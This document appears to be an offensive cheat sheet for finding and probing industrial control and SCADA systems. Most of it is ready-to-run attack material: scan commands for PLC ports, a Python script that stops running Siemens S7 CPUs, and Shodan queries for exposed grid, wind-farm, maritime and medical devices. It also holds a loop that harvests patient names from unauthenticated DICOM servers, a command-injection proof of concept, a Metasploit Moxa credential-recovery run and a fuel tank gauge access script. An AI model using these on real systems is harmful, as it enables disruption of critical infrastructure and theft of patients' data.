# :mechanical_arm:	 ICS/SCADA Enumeration Techniques for Effective Scanning, Network Reconnaissance, and Tactical Host Probing:

## General Enumeration:

```bash
nmap -Pn -sT --scan-delay 1s --max-parallelism 1 \
    -p
    80,102,443,502,530,593,789,1089-1091,1911,1962,2222,2404,4000,4840,4843,4911,9600,19999,20000,20547,34962-34964,34980,44818,46823,46824,55000-55003 \
    <target>
```

## Siemens S7

Enumerates Siemens S7 PLC Devices and collects their device information. This script is based off PLCScan that was developed by Positive Research and Scadastrangelove (https://code.google.com/p/plcscan/). This script is meant to provide the same functionality as PLCScan inside of Nmap. Some of the information that is collected by PLCScan was not ported over; this information can be parsed out of the packets that are received.

Usage:

```bash
nmap --script s7-info.nse -p 102 <host/s>
```

Output:

```bash
102/tcp open  Siemens S7 PLC
| s7-info:
|   Basic Hardware: 6ES7 315-2AG10-0AB0
|   System Name: SIMATIC 300(1)
|   Copyright: Original Siemens Equipment
|   Version: 2.6.9
|   Module Type: CPU 315-2 DP
|   Module: 6ES7 315-2AG10-0AB0
|_  Serial Number: S C-X4U421302009
```

For scalable scanning and reconnaissance, utilize masscan for faster enumeration:

```bash
masscan <IP Range> -p 102 -oL Possible_ICS.txt; cat Possible_ICS.txt | while read LINE; do nmap --script s7-info.nse -p 102 $(awk '{print $4}'); done
```

## Stopping S7 CPUs with Python:

```python
import snap7

client = snap7.client.Client()
client.connect("<PLC IP>", 0, 0)

cpu_state = client.get_cpu_state()

if cpu_state == "S7CpuStatusRun":
    client.plc_stop()
```

## Modbus Scanning

```bash
nmap -Pn -sT -p502 --script modbus-discover <target>

nmap -sT -Pn -p502 --script modbus-discover --script-args modbus-discover.aggressive=true <target>
```



## Bacnet

```bash
nmap -Pn -sU -p47808 --script bacnet-info <target>

# Siemens Bacnet P2 Enumeration 

nmap -Pn -sT -n -T4 -p5033 <target> 
```




## Enip

```nmap -Pn -sU -p44818 --script enip-info <target>```




## Niagara fOX

```nmap -Pn -sT -p1911,4911 --script fox-info <target>```



## Omron

```nmap -Pn -sU -p9600 --script omrom-info <target>```

## PCWorx Devices

PCWorx devices allow unaunthenticated requests that query for system information.

```nmap -Pn -sT -p1962 --script pcworx-info <target>```

# Shodan.io Queries

## Common ICS Devices

Siemens:

```sh
# SIMATIC devices
"SIMATIC" port:502,80,443,161,102

# SCALANCE switches
"SCALANCE" port:80,443,161,23

# SIMOTION controllers
"SIMOTION" port:502,102,80

# SIPLUS devices
"SIPLUS" port:502,102,80,443

# LOGO! controllers
"LOGO!" port:502,102,80

# RUGGEDCOM devices
"RUGGEDCOM" port:80,443,161,23

# S7-300 series
"S7-300" port:102,502

# S7-1200 series
"S7-1200" port:102,502,80,443

# S7-1500 series
"S7-1500" port:102,502,80,443

# Generic S7 devices
"S7" port:102,502

# SCALANCE X-series switches
"XB-" OR "XR-" port:80,443,161,23

# Siemens article numbers (6-prefix format)
"6GK" OR "6ES" OR "6EP" OR "6AV" port:102,502,80,443,161

# Specific SCALANCE article numbers
"6GK5" port:80,443,161,23
```

Omron:

```sh
# CJ series PLCs
"CJ2" OR "CJ1" port:9600,502,80

# NX/NJ series
"NX" OR "NJ" manufacturer:"Omron" port:502,80,443

# CP series
"CP1" OR "CP2" port:502,80,9600

# CRT/DRT series
"CRT" OR "DRT" manufacturer:"Omron" port:502,80

# Specific Omron models (using article number pattern)
"CJ2H-" OR "CP1L-" OR "NJ101-" port:502,80,9600
```

ABB:

```sh
# AC500 series PLCs
"AC500" port:502,80,443

# ABB industrial devices
manufacturer:"ABB" port:502,80,443,161

# PM/TB series devices
"PM56" OR "TB54" manufacturer:"ABB" port:502,80,443

# ABB article number format (1SAP...)
"1SAP" manufacturer:"ABB" port:502,80,443
```

## PLCs

Shodan one-liner for enumerating Siemens PLCs, SCADA software, and HMI web pages

```bash
root@RoseSecurity:~# shodan search --fields ip_str,port siemens > Siemens.txt; echo "$(cat Siemens.txt | awk '{if ($2 == "80" || $2 == "443") {print $1;} }')" > Siemens.txt; eyewitness -f Siemens.txt
```

HMI Screenshots

```
screenshot.label:ics
```

Siemens S7-1200 PLC

```
Location: /Default.mwsl
```

Siemens APOGEE Building Systems

```
Model Name: Siemens BACnet Field Panel
```

Siemens Desigo CC Building System Workstations

```
Model Name: Desigo CC
```

Omron CJ2 PLCs

```
Product name: CJ2*
```

Schneider Electric PLCs

```
Device Identification: Schneider Electric
```

Schneider Electric PowerLogic Series 800 Power Meter	

```
PowerLogic PM800
```

Schweitzer Engineering Laboratories Power Quality and Revenue Meter

```
SEL-735 Telnet Server
```

## Maritime 

Subsea Mission Control Panels

```
title:"Slocum Fleet Mission Control"
```

K4 Edge Routers and Maritime VSAT

```
"k4DCP5" country:US
```

KVH Commbox Terminals

```
html:commbox
```

Cobham Sailor VSAT

```
title:”sailor 900"
```

```
SAILOR 800 VSAT
```

Pepwave Cellular Routers

```
"Pepwave MAX"
```

```
cgi-bin/MANGA/index.cgi
```

## Miscellaneous

IEC 60870-5-104 (power grid SCADA)

```
port:2404 asdu
```

Nordex Wind Turbine Farms

```
http.title:"Nordex Control" "Windows 2000 5.0 x86" "Jetty/3.1 (JSP 1.1; Servlet 2.2; java 1.6.0_14)"
```

DICOM Medical X-Ray Machines

```
"DICOM Server Response" port:104
```

TeamViewer

```
port:5938 "\x17$\x11\x04\x00"
```

Yealink T49G VOIP Phones

```
Yealink T49G
```

Search for devices vulnerable to CVE-2022-22954:

VMware Workspace ONE Access and Identity Manager contain a remote code execution vulnerability due to server-side template injection. A malicious actor with network access can trigger a server-side template injection that may result in remote code execution.

```
http.favicon.hash:-1250474341
```
## Exposed DICOM Servers

Count patient names in US exposed DICOM medical servers with no authentication

```bash
$ shodan download search "tag:medical" "country:us"; shodan parse --fields ip_str search.json.gz > usa_dicom_ip ; for i in `cat usa_dicom_ip` ; do echo "///// Now connecting to $i ////" ; findscu -v -to 1 -P -k PatientName="*" $i 104 >> us_dicom_patient_names; wc -l us_dicom_patient_names ; done
```
## Zyxel Firewall Unauthenticated Remote Command Injection

Rapid7 discovered and reported a vulnerability that affects Zyxel firewalls supporting Zero Touch Provisioning (ZTP), which includes the ATP series, VPN series, and the USG FLEX series (including USG20-VPN and USG20W-VPN). The vulnerability, identified as CVE-2022-30525, allows an unauthenticated and remote attacker to achieve arbitrary code execution as the nobody user on the affected device.

```
title:"USG FLEX 100","USG FLEX 100w","USG FLEX 200","USG FLEX 500","USG FLEX 700","USG FLEX 50","USG FLEX 50w","ATP100","ATP200","ATP500","ATP700"
```

## SDT-CW3B1 1.1.0 - OS Command Injection (CVE-2021-46422)

```
poc:http://<IP>/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id
```

## Setting Up Shodan for Target Monitoring

1. Determine your home IP or target of interest's IP address

```bash
root@RoseSecurity# shodan myip
69.69.69.69
```

2. Create network alert

```bash
root@RoseSecurity# shodan create home 69.69.69.69
Successfully created network alert!
Alert ID: 34W09AETJKAHEDPX
```

3. Confirm that alert is generated

```bash
root@RoseSecurity# shodan alert info home 
home
Created: 2022-03-01:69:69:69000
Notifications: Disabled

Network Range(s):
> 69.69.69.69
Triggers:
> any
```

4. Turn on notification

```bash
root@RoseSecurity# shodan alert enable 34W09AETJKAHEDPX any
Successfully enabled Trigger: any
```

## ICS Common File Extensions

Python script to search for common ICS file extensions

```python
# Author: selmux
import os

ics_path = r'/path/to/dir/'                   # change  path
ics_ext = (
'.rtu',  
'.rdb', 
'.ctz', 
'.exp', 
'.hprb', 
'.selaprj',
'.xml',
'.bkp',
'.ssnet',
'.ncz',
'.prj',
'.rcd',
'.SYS_BASCOM.COM',
'.pcmp',
'.pcmi',
'.pcmt',
'.spj',
'.plz',
'.spj.prev',
'.adb',
'.opt',
'.out',
'.prp',
'.scl',
'.icd',
'.ied',
'.cid',
'.scd',
'.ssd',
'.ctz',
'.ap12',
'.ap13',
'.ap14',
'.ap15',
'.ap16',
'.ap17',
'.zap12',
'.zap13',
'.zap14',
'.zap15',
'.zap16',
'.zap17',
'.conf',
'.gz',
'.zip',
'.urs',
'.tcw',
'.hmb',
'.m6b',
'.sim',
'.syl',
'.cfg',
'.pt2',
'.l5x',
'.txt',
'.pl',
'.paf',
'.ini',
'.cin',
'.xrf',
'.v',
'.trc',
'.s5d',
'.s7p',
'.mwp',
'.s7f',
'.arj',
'.ekb',
'.license',
'.lic',
'.vstax',
'.cv4',
'.dtq',
'.pc5',
'.l5x',
'.eas',
'.l5k',
'.apa',
'.lic',
'.gsd',
'.gsg',
'.gse',
'.gsf',
'.gsi',
'.gsp',
'.gss'                                     
)

for root, dirs, files in os.walk(ics_path):
    for file in files:
        if file.endswith(ics_ext):
             print(os.path.join(root, file))
             
```

## Automated Tank Gauge (ATG) Remote Configuration Disclosure:

In 2015, HD Moore, the creator of Metasploit, published an article disclosing over 5,800 gas station Automated Tank Gauges (ATGs) which were publicly accessible. Besides monitoring for leakage, these systems are also instrumental in gauging fluid levels, tank temperature, and can alert operators when tank volumes are too high or have reached a critical low. ATGs are utilized by nearly every fueling station in the United States and tens of thousands of systems internationally. They are most commonly manufactured by Veeder-Root, a supplier of fuel dispensers, payment systems, and forecourt merchandising. For remote monitoring of these fuel systems, operators will commonly configure the ATG serial interface to an internet-facing TCP port (generally set to TCP 10001). This script reads the Get In-Tank Inventory Report from TCP/10001 as a proof of concept to demonstrate the arbitrary access.

```python
#!/usr/bin/env python3

 
import time
import socket            
with open("/tmp/ATG_SCAN.txt",'r') as atg_file:
    for line in atg_file.read().splitlines():
        try:
            atg_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = 10001
            search_str = 'IN-TANK INVENTORY'               
            msg = str('\x01' + 'I20100' + '\n').encode('ascii')
            atg_socket.connect((line, port))
            atg_socket.send(msg)
            time.sleep(.25)
            response = atg_socket.recv(1024).decode()
            if search_str in response:
                with open("/tmp/ATG_DEVICES.txt", 'a') as file2:
                    file2.write(line + "\t ->\tATG Device\n")
            else:
                continue
            atg_socket.close()   
        except:
            pass 
atg_file.close()
```

Video PoC:

https://www.youtube.com/watch?v=HkO4cs95erU&t=818s

## Access Moxa Devices:

SCADA system that uses Moxa brand products to establish connectivity and communication with industrial devices that are being monitored and controlled in a critical infrastructure or industrial process.

```console
"Moxa Nport Device" Status: Authentication enabled port:"4800"
"Moxa Nport Device" Status: Authentication disabled port:"4800"
shodan search --separator , --fields ip_str,port,data "Moxa Nport" | awk '{print $1,$2,$3}' FS=":" | tr '\\', ' ' | awk '{print $1,$7,$8}' | column -t | ccze -A
```

Metasploit:

```console
use auxiliary/admin/scada/moxa_credentials_recovery
set FUNCTION CREDS
set rport 4800
set rhosts 212.x.x.14
run
```

## MQTT Enumeration

MQTT is a lightweight messaging protocol often used in IoT (Internet of Things) applications.

- 1883: Default port for MQTT.
- 8883: Default port for MQTT over TLS/SSL.

```sh
nmap -p 1883 --script mqtt-info <target>
```

### Topic Enumeration

The following Rust application enumerates the topics of an MQTT target:

Usage:

```sh
./mqtt-topic-enumerator test.mosquitto.org

Topic: /PostGeneratorSensorValues/8e7acc5a-6d51-49ea-b289-d32c0a19eeb9/02df6380-958b-494d-a164-dc81038aade9
Topic: /SETE_TECNOLOGIA/relay52805/out/sw_version
Topic: /Sentinel/relay49847/out/hw_version
Topic: /Sentinel/relay49847/out/i1Topic: /ac/is_valid
Topic: /ac/power
Topic: /clientnotification/bridge1_status
Topic: /connection/statu0
```

Program:

```rust
use rumqttc::{Client, Event, MqttOptions, Packet, QoS};
use std::collections::HashSet;
use std::env;
use std::time::Duration;

fn main() {
    let args: Vec<String> = env::args().collect();
    let host = args
        .get(1)
        .map(String::as_str)
        .unwrap_or("test.mosquitto.org");
    let port: u16 = args.get(2).and_then(|p| p.parse().ok()).unwrap_or(1883);

    let mut mqttoptions = MqttOptions::new("rumqtt-enumerator", host, port);
    mqttoptions.set_keep_alive(Duration::from_secs(5));
    let (client, mut connection) = Client::new(mqttoptions, 10);

    client.subscribe("#", QoS::AtMostOnce).unwrap();

    let mut seen: HashSet<String> = HashSet::new();
    println!("Listening… press Ctrl-C to stop");

    for event in connection.iter() {
        match event {
            Ok(Event::Incoming(Packet::Publish(p))) => {
                let topic = &*p.topic; // Arc<str> → &str
                if seen.insert(topic.to_string()) {
                    println!("Topic: {topic}");
                }
            }
            Ok(_) => {}
            Err(e) => {
                eprintln!("Connection error: {e}");
                break;
            }
        }
    }
}
```
